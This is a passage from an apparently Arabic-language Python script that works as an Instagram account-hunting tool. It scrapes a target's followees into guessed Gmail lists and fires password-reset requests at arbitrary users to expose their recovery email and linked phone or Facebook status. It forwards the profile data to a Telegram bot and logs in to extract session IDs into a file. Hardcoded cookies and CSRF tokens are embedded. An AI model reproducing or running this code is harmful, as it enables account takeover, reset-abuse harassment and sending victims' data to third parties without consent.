		print(f'\033[1;35m[𖤥] - Done >> [{ok}]\n[𖤥] - Error : {t}\n[𖤥] - User >> \033[1;36m'+str(name3))
		count=count+1

def following():
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf gmail.txt')
	L = instaloader.Instaloader()
	username=input(" اكتب يوزر الحساب الوهمي : ")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	password=input(" اكتب باسورد الحساب الوهمي : ")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	getuser=input(" يوزر حساب سحب السته منه : ")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print("انتضر سيتم سحب اليوزرات")
	print(Z1+'━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	os.system('rm -rf gmail.txt')
	L.login(username,password)
	profile = instaloader.Profile.from_username(L.context, getuser)
	follow_list = []
	count=0
	ok=0
	for followee in profile.get_followees():
		name1=str(followee)
		name2=name1.split('Profile ')[1]
		name3=name2.split(' (')[0]
		follow_list.append(name3+'@gmail.com')
		file = open("gmail.txt","a")
		file.write(follow_list[count])
		file.write("\n")
		file.close()
		ok+=1
		os.system('cls' if os.name == 'nt' else'clear')
		print(f'\033[1;35m[𖤥] - Done >> [{ok}]\n[𖤥] - Error : {t}\n[𖤥] - User >> \033[1;36m'+str(name3))
		count=count+1
		     
		     
def resa():
	email = input( ' \033[1;36mENTAR EMAIL 🔺\033[1;32m ')
	check = Hamody.Reset(email)
	if check==True:
		print("\033[2;32m•  تم توصيل الريست •")
	else:
		 print("\033[1;31m• ريست خطا •")	
def insm():
	token = input(B+'ENTER TOKEN : ')
	print('\n')
	ID = input(B+' ENTER ID : ')
	print('\n')
	user = input(X+ 'user name : ')
	print('\n')
	print(F+'*'*60)
	api = f'https://www.instagram.com/{user}/?__a=1&__d=dis'
	rr=requests.get(api).json()
	nam = str(rr['graphql']['user']['full_name'])
	iddd = str(rr['graphql']['user']['id'])
	fol = str(rr['graphql']['user']['edge_followed_by']['count'])
	fols =str(rr['graphql']['user']['edge_follow']['count'])
	isp = str(rr['graphql']['user']['is_private'])
	bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
	urlr='https://www.instagram.com/accounts/account_recovery_ajax/'
	headr= {
					        'accept': '*/*',
					        'accept-encoding': 'gzip, deflate, br',
					        'accept-language': 'en-US,en;q=0.9',
					        'content-length': '336',
					        'content-type': 'application/x-www-form-urlencoded',
					        'cookie': 'mid=YuPxZAABAAEUVYcD2B0cFEzLEyuU; ig_did=50092572-86B8-4779-8D7D-ED783D6BE001; dpr=3; datr=lPHjYm79ZCBQZ-8kyLncySC7; shbid="572\05454072972258\0541691059333:01f70b5caa78629654a33ffe9055bdc7663b824064ba3854ecfade7109c72ee455eb5eb8"; shbts="1659523333\05454072972258\0541691059333:01f7ce1fd97040b48210c72b760bfbbf68254544b85860f356f3dc04622ee5bfd6edb2d9"; rur="RVA\05454072972258\0541691069797:01f7513337be7c4309672fc0a95436c4f0b60d9f1ff74355b61efadb1b1079fb38505eea"; csrftoken=tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'origin': 'https://www.instagram.com',
					        'referer': 'https://www.instagram.com/',
					        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
					        'sec-ch-ua-mobile': '?0',
					        'sec-fetch-dest': 'empty',
					        'sec-fetch-mode': 'cors',
					        'sec-fetch-site': 'same-origin',
					        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
					        'viewport-width': '30',
					        'x-asbd-id': '437806',
					        'x-csrftoken': 'tFhHVxw72H6VCMdP2tplXrBbqoFckW5N',
					        'x-ig-app-id': '936619743392459',
					        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
					        'x-instagram-ajax': 'caee87137ae9',
					        'x-requested-with': 'XMLHttpRequest'
						}
	datar={
							'query': f'{user}'
						}
	rq = requests.post(urlr,headers=headr,data=datar).json()
	fa =str(rq['options']['can_use_facebook'])
	if fa =='True':
		L3 = 'مربوط فيس بوك'
	else:
		L3='غير مربوط فيس بوك'
		ph = str(rq['options']['can_send_phone'])
	if ph =='True':
		L5 = ('مربوط رقم')
	else:
		L5='غير مربوط رقم'
	re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
	ree = re.json()
	dat = ree['date']
	headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',

        'Accept-Language': 'en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
							}
	data = {
        'ig_sig_key_version': '4',
        "user_id":iddd
							}
	res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
	rs =str(res['obfuscated_email'])
	lo = (f'''
{F}

name : » {nam}
user :  » {user}
fols :  » {fols}
folo :  » {fol}
date : » {dat}
post : » {bio}
ID   : » {iddd}
Rest : » {rs}
𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 : {L3}
𝙽𝙺𝙼𝙱𝙴𝚁 𝙿𝙷𝙾𝙽𝙴 : {L5}
TELE:- @W4_M4 ''')
	print(lo)
	print(' تم ارسال معلومات لبوت التليجرام         ')
	tlg =(f"""
━━━━━━━━⧪━━━━━━━━
اسم الحساب » {nam}
يوزر الحساب » @{user}
اليتابعهم » {fols}
المتابعين » {fol}
تاريخ الحساب » {dat}
الايدي » {iddd}
منشورات الحساب» {bio}
ريست الحساب » {rs}
فيسبوك : {L3}
رقم الهاتف : {L5}
———————×———————
TELE:- @W4_M4 """)
	print(Y+'='*60)
	requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))		    	     
def sison():
	USER = input(Fore.GREEN+'حط اسم المستخدم :')
	PASS = input(Fore.GREEN+'حط كلمه المرور :')
	url = 'https://www.instagram.com/accounts/login/ajax/'
	headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "385",
        "content-type": "application/x-www-form-urlencoded",
        "cookie": "csrftoken=Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC; mid=YSuaiwAEAAEzvEB8maY7IzJ6MDzJ; ig_did=07753880-8B96-4C09-93E9-BA39B801DD08",
        "origin": "https://www.instagram.com",
        "referer": "https://www.instagram.com/accounts/login/",
        "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "x-asbd-id": "437806",
        "x-csrftoken": "Lk9Lfwj0Hp0T3zCBYwjoeGBUBjU1sVXC",
        "x-ig-app-id": "936619743392459",
        "x-ig-www-claim": "0",
        "x-instagram-ajax": "56f3c2d2a823",
        "x-requested-with": "XMLHttpRequest"
    }
	data = {
        "username": f"{USER}",
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:1613414957:{PASS}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }

	req_login = requests.post(url, headers=headers, data=data)
	if '"authenticated":false' in req_login.text:
		print(Fore.RED+'خطا في اليوزر او الباسورد')
		exit(0)
	elif '"authenticated":true' in req_login.text:
		print(Fore.GREEN+'[+] Done Login')
	sess = req_login.cookies['sessionid']
	time.sleep(1)
	with open('sessionid.txt','a') as s:
		s.write(f"{sess}\n")
		print(f'\n\n{sess}\n\n')
		print(Fore.MAGENTA+'تم حفظ السيزن ايدي في ملف sessionid.txt [+]')	     
		     	        
def O():
	try:
		os.remove('gmail.txt')		
		print('Done - تم حذف الملف بنجاح')
	except FileNotFoundError as error:
		system('clear')
		print('Error - ملف gmail.txt غير متوفر في جهازك')
print('\033[1;32m		قسم صيد متاحات انستا\n\033[1;32m[1] - List Username - انشاء لستة عشوائية\n[2] - List username - انشاء لستة من يوزر\n[3] - Cheker List - فحص لستة\n[4] - list From Following - لستة من المتابعهم\n[5] - list From Followers - لستة من المتابعين\n[6] - list From Post like account - لستة من بوست لايكات\n[7] - list From search - لستة من بحث\n━━━━━━━━⧪━━━━━━━━\n		\033[2;36mقسم المعلومات\n[8] - rest Instagram - توصيل ريست انستا\n[9] - Insta information - معلومات انستا\n━━━━━━━━⧪━━━━━━━━\n	\033[1;33m	قسم صيد يوزرات الانستا\n[10] - Cheker USERS insta - صيد يوزرات انستا عشوائي\n[11] - Cheker USERS Insta File - صيد يوزرات انستا من ملف\n———————×———————\n[12] - SESION Insta -  استخراج سيزن انستا\n[0] - Remove List - حذف لستة')
#\n[0] - Remove List - حذف لستة
try:
	H = int(input('\033[1;35m[!] - Enter Your - ارسل رقم : '))
	system("clear")
except ValueError as error:
	system('clear')
	print('Error - لا يجوز اختيار احرف')
	exit()
if H ==1:		
		zaid9()
		exit()
elif H==2:
	Cl()
	exit()
elif H==3:
	
	Gmail()
	exit()
elif H==4:
	following()
	exit()
elif H==5:
	followers()
	exit()
if H ==6:
  usernames = input("\033[1;32m⌯\033[1;39m Enter usernames:")
  password = input("\033[1;32m⌯\033[1;39m Enter password:")
  print("-"*20)
  checker(usernames,password).likes()
  exit()
elif H == 7:
	usernames = input("\033[1;32m⌯\033[1;39m Enter usernames:")
	password = input("\033[1;32m⌯\033[1;39m Enter password:")
	print("-"*20)
	checker(usernames,password).search()	
	exit()
elif H == 8:
	resa()
	exit()
elif H ==9:
	insm()
	exit()
elif H ==10:
  id =input(f'\033[1;33m[\033[1;31m⌯\033[1;33m] Id bot :\033[1;36m')
  token=input(f'\033[1;33m[\033[1;31m⌯\033[1;33m] Token bot :\033[1;36m')
  Len =number=input(f'\033[1;33m[\033[1;31m⌯\033[1;33m] USERS insta - صيد عشوائي  :\033[1;36m')
  print("="*20)
  app(token,id).random_user(Len)
  exit()
elif H ==11:
  name_file =number=input(f'\033[1;33m[\033[1;31m⌯\033[1;33m] Enter Name File - ارسل اسم الملف  :\033[1;36m')
  print("="*20)
  app(token,id).file_user(name_file)
  exit()
elif H==12:
	sison()  	
	exit()

elif H ==0:
	O()
	exit()
else:
	system('clear')
	print('Error - اختيار خطأ')
	exit()
